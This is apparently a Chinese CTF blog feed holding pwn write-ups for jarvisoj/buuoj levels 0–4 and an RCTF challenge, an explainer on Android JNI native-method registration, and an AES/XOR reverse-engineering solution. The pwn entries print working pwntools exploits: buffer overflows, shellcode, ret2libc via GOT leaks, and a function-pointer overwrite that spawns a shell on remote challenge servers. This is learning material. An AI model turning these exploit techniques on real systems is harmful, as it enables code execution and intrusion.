        <content type="html"><![CDATA[<h3 id="level0"><a href="#level0" class="headerlink" title="level0:"></a>level0:</h3><span id="more"></span><p>栈溢出</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *r=remote('node4.buuoj.cn', xxxxx)payload = b'a' * (0x80 + 8) + p64(0x0000000000400596)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level1"><a href="#level1" class="headerlink" title="level1:"></a>level1:</h3><p>shellcode</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *r = process(['/mnt/d/TH/ctf/buuoj/level1'])shellcode = asm(shellcraft.sh())buf = r.recvline()[14:-2]buf = int(buf, 16)payload = shellcode + b'a' * (136 + 4 - len(shellcode)) + p32(buf)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2:"></a>level2:</h3><p>劫持rip, 转到system函数, 然后提前把参数压到栈中.</p><h3 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h3><p>利用write输出从got表中write的地址获得偏移, 然后算出库中具体system和binsh内存地址.(地址泄露)</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *r = connect("pwn2.jarvisoj.com", 9879)#r = process(['/mnt/d/TH/ctf/buuoj/level2'])#shellcode = asm(shellcraft.sh())elf = ELF("./level3")writeplt = elf.plt["write"]writegot = elf.got["write"]fun = elf.symbols["vulnerable_function"]lib = ELF("./libc-2.19.so")writelib = 0x000DD460systemlib = 0x00040310bsh = 0x00162D4Cbuf = r.recvline()payload = b'a' * (136 + 4) + p32(writeplt) + p32(fun) + p32(1) + p32(writegot) + p32(4)r.sendline(payload)writeaddr = u32(r.recvline()[0:4])payload = b'a' * (136 + 4) + p32(writeaddr - writelib + systemlib) + p32(0) + p32(writeaddr - writelib + bsh)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level4"><a href="#level4" class="headerlink" title="level4:"></a>level4:</h3><p>利用工具LibcSearcher, 本来想用dyn的, 但是不知道为什么报错.用LibcSearcher搜索出来的都是官方库, dyn是直接dump出来靶机的库.</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *from LibcSearcher import *r = connect("pwn2.jarvisoj.com", 9880)#r = process(['/mnt/d/TH/ctf/jarvis/level4'])#shellcode = asm(shellcraft.sh())e = ELF("./level4")writeplt = e.plt["write"]writegot = e.got["write"]readplt = e.plt["read"]data_seg = 0x0804A01Cfun = e.symbols["vulnerable_function"]payload = b'a' * (0x88 + 0x4) + p32(writeplt) + p32(fun) + p32(1) + p32(writegot) + p32(4)r.sendline(payload)writeaddr = u32(r.recv(4))libc = LibcSearcher("write", writeaddr)deviation = writeaddr - libc.dump("write")sys_addr = libc.dump("system") + deviationpayload = b'a' * (0x88 + 0x4) + p32(readplt) + p32(fun) + p32(0) + p32(data_seg) + p32(0x8)r.sendline(payload)r.sendline("/bin/sh")payload = b'a' * (0x88 + 0x4) + p32(sys_addr) + p32(0) + p32(data_seg)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level5"><a href="#level5" class="headerlink" title="level5:"></a>level5:</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>android_static_and_dynamic_registration</title>
      <link href="/2021/09/28/android-static-and-dynamic-registration/"/>
      <url>/2021/09/28/android-static-and-dynamic-registration/</url>
      
        <content type="html"><![CDATA[<h2 id="android-JNI静态注册和动态注册"><a href="#android-JNI静态注册和动态注册" class="headerlink" title="android JNI静态注册和动态注册"></a>android JNI静态注册和动态注册</h2><p>这几天在摸android的题目, 在XCTF里面做了一个ONLOAD来动态注册native的题目, 但是本身ida的export能够找到对应native函数名. 想找找ONLOAD注册方法和直接调用的关系, 就仔细去翻了一些相关的帖子.</p><span id="more"></span><p><img src="/2021/09/28/android-static-and-dynamic-registration/image-20210926113347793.png" alt="image-20210926113347793"></p><p>这个OnLoad注册了一个名为CheckFlag的方法.</p><p>windows的exe在调用DLL的时候是通过IAT, 而IAT的填充是PE装载器调用GetProAddress()查找DLL的EAT来实现.</p><p>既然windows是查找export来获取库函数, 那android调用so是不是也是根据export来的?这个注册是不是改变的export来完成代替ChckFlag方法呢.</p><p>native方法分为静态注册和动态注册两种.(我的环境是java16)</p><h3 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h3><p>java的每个方法都会有一个Method对象, 而这个Method对象有两个成员:nativeFunc和insns.</p><p>当java构建这个native方法时, 会将该方法对应的Method对象的nativeFunc成员设置为dvmResolveNativeMethod, dvmResolveNativeMethod方法会按照方法的名称去查找对应的C方法.</p><pre class="line-numbers language-none"><code class="language-none">void dvmResolveNativeMethod(const u4* args, JValue* pResult,    const Method* method, Thread* self){    ClassObject* clazz = method-&gt;clazz;    /*     * If this is a static method, it could be called before the class     * has been initialized.     */    if (dvmIsStaticMethod(method)) {        if (!dvmIsClassInitialized(clazz) &amp;&amp; !dvmInitClass(clazz)) {            assert(dvmCheckException(dvmThreadSelf()));            return;        }    } else {        assert(dvmIsClassInitialized(clazz) ||               dvmIsClassInitializing(clazz));    }    /* start with our internal-native methods */    DalvikNativeFunc infunc = dvmLookupInternalNativeMethod(method);    if (infunc != NULL) {        /* resolution always gets the same answer, so no race here */        IF_LOGVV() {            char* desc = dexProtoCopyMethodDescriptor(&amp;method-&gt;prototype);            LOGVV("+++ resolved native %s.%s %s, invoking",                clazz-&gt;descriptor, method-&gt;name, desc);            free(desc);        }        if (dvmIsSynchronizedMethod(method)) {            ALOGE("ERROR: internal-native can't be declared 'synchronized'");            ALOGE("Failing on %s.%s", method-&gt;clazz-&gt;descriptor, method-&gt;name);            dvmAbort();     // harsh, but this is VM-internal problem        }        DalvikBridgeFunc dfunc = (DalvikBridgeFunc) infunc;        dvmSetNativeFunc((Method*) method, dfunc, NULL);        dfunc(args, pResult, method, self);        return;    }    /* now scan any DLLs we have loaded for JNI signatures */    void* func = lookupSharedLibMethod(method);    if (func != NULL) {        /* found it, point it at the JNI bridge and then call it */        dvmUseJNIBridge((Method*) method, func);        (*method-&gt;nativeFunc)(args, pResult, method, self);        return;    }    IF_ALOGW() {        char* desc = dexProtoCopyMethodDescriptor(&amp;method-&gt;prototype);        ALOGW("No implementation found for native %s.%s:%s",            clazz-&gt;descriptor, method-&gt;name, desc);        free(desc);    }    dvmThrowUnsatisfiedLinkError("Native method not found", method);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>lookupSharedLibMethod函数用来查找SO层里面的方法, 再看下lookupSharedLibMethod代码</p><pre class="line-numbers language-none"><code class="language-none">static void* lookupSharedLibMethod(const Method* method){    if (gDvm.nativeLibs == NULL) {        ALOGE("Unexpected init state: nativeLibs not ready");        dvmAbort();    }    return (void*) dvmHashForeach(gDvm.nativeLibs, findMethodInLib,        (void*) method);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dvmHashForeach的注释是</p><pre class="line-numbers language-none"><code class="language-none">int dvmHashForeach(HashTable* pHashTable, HashForeachFunc func, void* arg);/* * Execute "func" on every entry in the hash table. * * If "func" returns 1 detach the entry from the hash table. Does not invoke * the "free" function. * * Returning values other than 0 or 1 from "func" will abort the routine. */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>findMethodInLib:</p><pre class="line-numbers language-none"><code class="language-none">static int findMethodInLib(void* vlib, void* vmethod){    const SharedLib* pLib = (const SharedLib*) vlib;    const Method* meth = (const Method*) vmethod;    char* preMangleCM = NULL;    char* mangleCM = NULL;    char* mangleSig = NULL;    char* mangleCMSig = NULL;    void* func = NULL;    int len;    if (meth-&gt;clazz-&gt;classLoader != pLib-&gt;classLoader) {        ALOGV("+++ not scanning '%s' for '%s' (wrong CL)",            pLib-&gt;pathName, meth-&gt;name);        return 0;    } else        ALOGV("+++ scanning '%s' for '%s'", pLib-&gt;pathName, meth-&gt;name);    /*     * First, we try it without the signature.     */    preMangleCM =        createJniNameString(meth-&gt;clazz-&gt;descriptor, meth-&gt;name, &amp;len);    if (preMangleCM == NULL)        goto bail;    mangleCM = mangleString(preMangleCM, len);    if (mangleCM == NULL)        goto bail;    ALOGV("+++ calling dlsym(%s)", mangleCM);    func = dlsym(pLib-&gt;handle, mangleCM);    if (func == NULL) {        mangleSig =            createMangledSignature(&amp;meth-&gt;prototype);        if (mangleSig == NULL)            goto bail;        mangleCMSig = (char*) malloc(strlen(mangleCM) + strlen(mangleSig) +3);        if (mangleCMSig == NULL)            goto bail;        sprintf(mangleCMSig, "%s__%s", mangleCM, mangleSig);        ALOGV("+++ calling dlsym(%s)", mangleCMSig);        func = dlsym(pLib-&gt;handle, mangleCMSig);        if (func != NULL) {            ALOGV("Found '%s' with dlsym", mangleCMSig);        }    } else {        ALOGV("Found '%s' with dlsym", mangleCM);    }bail:    free(preMangleCM);    free(mangleCM);    free(mangleSig);    free(mangleCMSig);    return (int) func;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终通过调用dlsym来查找so文件里面的方法, 这和windows的GetProAddress()很类似了.</p><p>在dvmResolveNativeMethod找到对应的方法后, 会对native方法对应的方法对象进行再一次赋值, </p><p>nativeFunc = dvmCallJNIMethod, insns = 找到的so中的方法地址.</p><p>dvmCallJNIMethod方法是一个bridge方法, 这个方法的作用就是调用insns对应的方法</p><p>当native方法对象构建好了之后, nativeFunc中已经有值, 这样就会直接执行nativeFunc方法</p><h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h3><p>动态注册是将RegisterNatives放在OnLoad方法里面, 在加载库的时候, 会通过dlsym调用Onload方法.</p><p>System.java:</p><pre class="line-numbers language-none"><code class="language-none">public static void loadLibrary(String libname) {    Runtime.getRuntime().loadLibrary0(Reflection.getCallerClass(), libname);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Runtime.class:</p><pre class="line-numbers language-none"><code class="language-none">void loadLibrary0(Class&lt;?&gt; fromClass, String libname) {    SecurityManager security = System.getSecurityManager();    if (security != null) {        security.checkLink(libname);    }    if (libname.indexOf((int)File.separatorChar) != -1) {        throw new UnsatisfiedLinkError(            "Directory separator should not appear in library name: " + libname);    }    ClassLoader.loadLibrary(fromClass, libname);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ClassLoader.loadLibrary:</p><pre class="line-numbers language-none"><code class="language-none">static NativeLibrary loadLibrary(Class&lt;?&gt; fromClass, String name) {    ClassLoader loader = (fromClass == null) ? null : fromClass.getClassLoader();    if (loader == null) {        NativeLibrary nl = BootLoader.getNativeLibraries().loadLibrary(fromClass, name);        if (nl != null) {            return nl;        }        throw new UnsatisfiedLinkError("no " + name +                " in system library path: " + StaticProperty.sunBootLibraryPath());    }    NativeLibraries libs = loader.libraries;    // First load from the file returned from ClassLoader::findLibrary, if found.    String libfilename = loader.findLibrary(name);    if (libfilename != null) {        File libfile = new File(libfilename);        if (!libfile.isAbsolute()) {            throw new UnsatisfiedLinkError(                    "ClassLoader.findLibrary failed to return an absolute path: " + libfilename);        }        NativeLibrary nl = libs.loadLibrary(fromClass, libfile);        if (nl != null) {            return nl;        }        throw new UnsatisfiedLinkError("Can't load " + libfilename);    }    // Then load from system library path and java library path    NativeLibrary nl = libs.loadLibrary(fromClass, name);    if (nl != null) {        return nl;    }    // Oops, it failed    throw new UnsatisfiedLinkError("no " + name +            " in java.library.path: " + StaticProperty.javaLibraryPath());}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>libs.loadLibrary():</p><pre class="line-numbers language-none"><code class="language-none">public NativeLibrary loadLibrary(Class&lt;?&gt; fromClass, String name) {    assert name.indexOf(File.separatorChar) &lt; 0;    NativeLibrary lib = findFromPaths(LibraryPaths.SYS_PATHS, fromClass, name);    if (lib == null &amp;&amp; searchJavaLibraryPath) {        lib = findFromPaths(LibraryPaths.USER_PATHS, fromClass, name);    }    return lib;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>findFromPaths():</p><pre class="line-numbers language-none"><code class="language-none">private NativeLibrary findFromPaths(String[] paths, Class&lt;?&gt; fromClass, String name) {    for (String path : paths) {        File libfile = new File(path, System.mapLibraryName(name));        NativeLibrary nl = loadLibrary(fromClass, libfile);        if (nl != null) {            return nl;        }        libfile = ClassLoaderHelper.mapAlternativeName(libfile);        if (libfile != null) {            nl = loadLibrary(fromClass, libfile);            if (nl != null) {                return nl;            }        }    }    return null;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>loadLibrary():</p><pre class="line-numbers language-none"><code class="language-none">public NativeLibrary loadLibrary(Class&lt;?&gt; fromClass, File file) {    // Check to see if we're attempting to access a static library    String name = findBuiltinLib(file.getName());    boolean isBuiltin = (name != null);    if (!isBuiltin) {        name = AccessController.doPrivileged(new PrivilegedAction&lt;&gt;() {            public String run() {                try {                    return file.exists() ? file.getCanonicalPath() : null;                } catch (IOException e) {                    return null;                }            }        });        if (name == null) {            return null;        }    }    return loadLibrary(fromClass, name, isBuiltin);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">private NativeLibrary loadLibrary(Class&lt;?&gt; fromClass, String name, boolean isBuiltin){... try {         if (!lib.open()) {         return null;    // fail to open the native library     }     ...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">boolean open() {            if (handle != 0) {                throw new InternalError("Native library " + name + " has been loaded");            }            return load(this, name, isBuiltin, isJNI);        }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后发现居然最后调用了一个native :</p><pre class="line-numbers language-none"><code class="language-none">private static native boolean load(NativeLibraryImpl impl, String name, boolean isBuiltin, boolean isJNI);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NativeLibraries.c:</p><pre class="line-numbers language-none"><code class="language-none">Java_jdk_internal_loader_NativeLibraries_load  (JNIEnv *env, jobject this, jobject lib, jstring name, jboolean isBuiltin, jboolean isJNI){    const char *cname;    jint jniVersion;    jthrowable cause;    void * handle;    jboolean loaded = JNI_FALSE;    if (!initIDs(env))        return JNI_FALSE;    cname = JNU_GetStringPlatformChars(env, name, 0);    if (cname == 0)        return JNI_FALSE;    handle = isBuiltin ? procHandle : JVM_LoadLibrary(cname);    if (isJNI) {        if (handle) {            JNI_OnLoad_t JNI_OnLoad;            JNI_OnLoad = (JNI_OnLoad_t)findJniFunction(env, handle,                                                       isBuiltin ? cname : NULL,                                                       JNI_TRUE);            if (JNI_OnLoad) {                JavaVM *jvm;                (*env)-&gt;GetJavaVM(env, &amp;jvm);                jniVersion = (*JNI_OnLoad)(jvm, NULL); //应该是执行JNI_Onload的地方            } else {                jniVersion = 0x00010001;            }            cause = (*env)-&gt;ExceptionOccurred(env);            if (cause) {                (*env)-&gt;ExceptionClear(env);                (*env)-&gt;Throw(env, cause);                if (!isBuiltin) {                    JVM_UnloadLibrary(handle);                }                goto done;            }            if (!JVM_IsSupportedJNIVersion(jniVersion) ||                (isBuiltin &amp;&amp; jniVersion &lt; JNI_VERSION_1_8)) {                char msg[256];                jio_snprintf(msg, sizeof(msg),                             "unsupported JNI version 0x%08X required by %s",                             jniVersion, cname);                JNU_ThrowByName(env, "java/lang/UnsatisfiedLinkError", msg);                if (!isBuiltin) {                    JVM_UnloadLibrary(handle);                }                goto done;            }            (*env)-&gt;SetIntField(env, lib, jniVersionID, jniVersion);        } else {            cause = (*env)-&gt;ExceptionOccurred(env);            if (cause) {                (*env)-&gt;ExceptionClear(env);                (*env)-&gt;SetLongField(env, lib, handleID, (jlong)0);                (*env)-&gt;Throw(env, cause);            }            goto done;        }    }    (*env)-&gt;SetLongField(env, lib, handleID, ptr_to_jlong(handle));    loaded = JNI_TRUE; done:    JNU_ReleaseStringPlatformChars(env, name, cname);    return loaded;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>findJniFunction:</p><pre class="line-numbers language-none"><code class="language-none">static void *findJniFunction(JNIEnv *env, void *handle,                                    const char *cname, jboolean isLoad) {    const char *onLoadSymbols[] = JNI_ONLOAD_SYMBOLS;    const char *onUnloadSymbols[] = JNI_ONUNLOAD_SYMBOLS;    const char **syms;    int symsLen;    void *entryName = NULL;    char *jniFunctionName;    int i;    size_t len;    // Check for JNI_On(Un)Load&lt;_libname&gt; function    if (isLoad) {        syms = onLoadSymbols;        symsLen = sizeof(onLoadSymbols) / sizeof(char *);    } else {        syms = onUnloadSymbols;        symsLen = sizeof(onUnloadSymbols) / sizeof(char *);    }    for (i = 0; i &lt; symsLen; i++) {        // cname + sym + '_' + '\0'        if ((len = (cname != NULL ? strlen(cname) : 0) + strlen(syms[i]) + 2) &gt;            FILENAME_MAX) {            goto done;        }        jniFunctionName = malloc(len);        if (jniFunctionName == NULL) {            JNU_ThrowOutOfMemoryError(env, NULL);            goto done;        }        buildJniFunctionName(syms[i], cname, jniFunctionName); //jniEntryName = _JNI_OnLoad        entryName = JVM_FindLibraryEntry(handle, jniFunctionName);        free(jniFunctionName);        if(entryName) {            break;        }    } done:    return entryName;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>buildJniFunctionName:</p><pre class="line-numbers language-none"><code class="language-none">void buildJniFunctionName(const char *sym, const char *cname,                          char *jniEntryName) {    if (cname != NULL) {        char *p = strrchr(sym, '@');        if (p != NULL &amp;&amp; p != sym) {            // sym == _JNI_OnLoad@8            strncpy(jniEntryName, sym, (p - sym));            jniEntryName[(p-sym)] = '\0';            // jniEntryName == _JNI_OnLoad            strcat(jniEntryName, "_");            strcat(jniEntryName, cname);            strcat(jniEntryName, p);            //jniEntryName == _JNI_OnLoad_cname@8        } else {            strcpy(jniEntryName, sym);            strcat(jniEntryName, "_");            strcat(jniEntryName, cname);        }    } else {        strcpy(jniEntryName, sym);    }    return;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JVM_FindLibraryEntry中调用了dlsym()</p><pre class="line-numbers language-none"><code class="language-none">JNIEXPORT void* JNICALL JVM_FindLibraryEntry(void* handle, const char* name) {...else {        return dlsym(handle, name);    }    ...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在Onload里面写RegisterNatives方法就可以进行方法注册:</p><p>RegisterNatives的第二个参数为JNINativeMethod类型, 这个类型的定义为:</p><pre class="line-numbers language-none"><code class="language-none">typedef struct {    const char* name;  //Java层native函数名    const char* signature;     void*       fnPtr; //so层对应的函数指针} JNINativeMethod;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后对native方法对应的方法对象进行赋值, 和静态注册类似</p><p>nativeFunc = dvmCallJNIMethod, insns = 找到的so中的方法地址.</p><p>最后可以总结一些, 在静态注册的时候, 是通过dlsym查找so文件的export.动态注册的时候, 是事先对结构体中的函数指针进行赋值, 通过RegisterNatives进行注册.当注册好了之后, native方法对应的方法对象的成员nativeFunc==dvmCallJNIMethod, 就不会在再设置为dvmResolveNativeMethod, 而是直接执行vmCallJNIMethod, 调用insns的方法.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>天翼杯</title>
      <link href="/2021/09/25/%E5%A4%A9%E7%BF%BC%E6%9D%AF/"/>
      <url>/2021/09/25/%E5%A4%A9%E7%BF%BC%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="revvverse"><a href="#revvverse" class="headerlink" title="revvverse"></a>revvverse</h3><span id="more"></span><p>先判断flag格式, 然后取中间</p><p>2字节2字节的取, 类似于atoi的转化.比如aabb 转化为0xaa 0xbb</p><pre class="line-numbers language-none"><code class="language-none">sub_47C0D0(dest, v65, (__int64)v65);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>异或加密, 调试可以发现异或的数据是(不会因为输入发生变化)</p><pre class="line-numbers language-none"><code class="language-none">0x7c, 0x55, 0x3b, 0xf4, 0xcb, 0x74, 0x38, 0xea, 0x2b, 0xeb, 0xa8, 0x67, 0x5d, 0x13, 0x9c, 0xbb.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来是对密钥和IV进行生成, 直接跑, 然后看内存就行了.</p><pre class="line-numbers language-none"><code class="language-none">密钥0xC4, 0x92, 0xA1, 0x76, 0x2F, 0x26, 0x0E, 0x6F, 0x3B, 0xBF, 0xA4, 0xE9, 0xDB, 0x54, 0x25, 0x4EIV B6 4C 8A 9D C5 EA F4 A6 FA F6 70 16 D7 E6 6D B9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>密文</p><pre class="line-numbers language-none"><code class="language-none">0x16, 0xF0, 0x3F, 0x5B, 0x38, 0xB9, 0x80, 0x90    0x1D, 0xA3, 0x58, 0xD8, 0xE6, 0xED, 0x97, 0xE3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>观察字符串, 看起来很像是des加密, 多次尝试之后, 发现不是, 密钥长度也不对3des也不对, 用findcrypto插件可以找有AES. 试试了一下, 果然是.</p><p>AES解密后</p><pre class="line-numbers language-none"><code class="language-none">0x5F,0x79,0x3D,0x30,0xA1,0xA9,0xDD,0x85,0xC1,0x20,0x05,0xE3,0xE6,0x1A,0xF3,0x7A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解密脚本:</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;iostream&gt;using namespace std;int main(){    unsigned a[] = {0x5F, 0x79, 0x3D, 0x30, 0xA1, 0xA9, 0xDD, 0x85, 0xC1, 0x20, 0x05, 0xE3, 0xE6, 0x1A, 0xF3, 0x7A};    unsigned b[] = {0x7c, 0x55, 0x3b, 0xf4, 0xcb, 0x74, 0x38, 0xea, 0x2b, 0xeb, 0xa8, 0x67, 0x5d, 0x13, 0x9c, 0xbb};    for (int i = 0; i &lt; 16; i++)    {        a[i] ^= b[i];        printf("%02x", a[i]);    }    system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>rctf-two_shortest</title>
      <link href="/2021/09/14/rctf-two-shortest/"/>
      <url>/2021/09/14/rctf-two-shortest/</url>
      
        <content type="html"><![CDATA[<p>这是一道pascal逆向+pwn</p><span id="more"></span><p>搜索字符串得到FPC 3.2.2 [2021/05/31] for x86_64 - Linux</p><p>FPC是pascal的编译器, </p><p>下好编译器, 编译器几份文件去bindiff.</p><p>重点是要编译一下system()这个函数.</p><p>网上抄的:</p><pre class="line-numbers language-none"><code class="language-none">program Greetings;constmessage = ' Welcome to the world of Pascal ';typename = string;varfirstname, surname: name;beginwriteln('Please enter your first name: ');readln(firstname);writeln('Please enter your surname: ');readln(surname);writeln;writeln(message, ' ', firstname, ' ', surname);end.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">program exRecursion;var   num, f: integer;function fact(x: integer): integer; (* calculates factorial of x - x! *)begin   if x=0 then      fact := 1   else      fact := x * fact(x-1); (* recursive call *)end; { end of function fact}begin   writeln(' Enter a number: ');   readln(num);   f := fact(num);   writeln(' Factorial ', num, ' is: ' , f);end.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">rogram example56;uses Unix;{ Program to demonstrate the Shell function }Var S : Longint;begin  Writeln ('Output of ls -l *.pp');  S:=fpSystem('ls -l *.pp');  Writeln ('Command exited with status : ',S);end.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后比较ida的分析结果和源代码,找到类system函数在这</p><pre class="line-numbers language-none"><code class="language-none">int mysystem(const char *command){  return system((__int64)"./185");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>SYSTEM____SETTEXTCODEPAGE_TEXT_WORD函数会发生执行.</p><pre class="line-numbers language-none"><code class="language-none">__int64 __fastcall SYSTEM____SETTEXTCODEPAGE_TEXT_WORD(__int64 a1){  __int64 result; // rax  result = a1;  if ( *(_QWORD *)(a1 + 64) )    return (*(__int64 (__fastcall **)(__int64))(a1 + 64))(a1);  return result;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是是SYSTEM____SETTEXTCODEPAGE_TEXT_WORD函数参数的生成</p><pre class="line-numbers language-none"><code class="language-none">unsigned int *fpc_get_input(){  if ( off_4EA620 )    return (unsigned int *)off_4EA620(off_4E8AC0[0]);  else    return &amp;off_4E8AC0[2];}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的输入可以越界去修改</p><pre class="line-numbers language-none"><code class="language-none">dword_437800[400 * input3 - 401 + input4] = input_tmp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只要去修改了off_4E8AC0数组的值, 就可以修改SYSTEM____SETTEXTCODEPAGE_TEXT_WORD函数的函数指针的执行.</p><p>a1数组的0_offset为参数, *(a1 + 64) 为执行函数目标是system(“/bin/sh”)</p><p>这里的/bin/sh修改*a1的值, 地址不变.</p><p>可以发现出问题了, 是iocheck函数的原因.</p><p>但是只修改为$0(另外一种shell方式), 这样就可以执行了.</p><pre class="line-numbers language-none"><code class="language-none">from pwn import * context.log_level='debug'def strr(array):payload = ''for i in array:payload += str(i) + '\n'return payload# cn = process("./185")# nc 124.70.137.88 60000cn = remote("124.70.137.88", 60000)payload  = strr([1, 4, # arg =&gt; binsh # 725704454,227, # 0x6e69622f, 0x003024, # '$0\x00'# # 725705# 454,# 228, # 0x0068732f, # 725768454, 243, # 0x0000000000424960, # system # 0x0000000004012D0])cn.sendline(payload)cn.interactive() <span aria-hidden="true" 